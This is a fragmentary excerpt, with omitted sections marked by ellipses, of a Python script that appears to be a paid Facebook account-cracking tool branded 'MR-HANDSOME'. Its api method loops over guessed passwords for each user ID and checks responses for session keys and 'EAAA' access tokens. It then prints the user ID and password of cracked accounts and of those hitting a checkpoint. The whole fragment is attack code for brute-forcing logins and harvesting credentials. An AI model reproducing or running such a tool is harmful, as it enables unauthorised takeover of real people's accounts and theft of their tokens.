...
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : FB TRICKS BY MR-HANDSOME
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : HANDSOME
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : PAID
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [HANDSOME] : %s/%s -> \033[0;92m [ HANDSOME-OK:%s ]- \033[0;91m[HANDSOME-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [HANDSOME-CP] %s | %s\033[0;97m         "%(uid, pw))
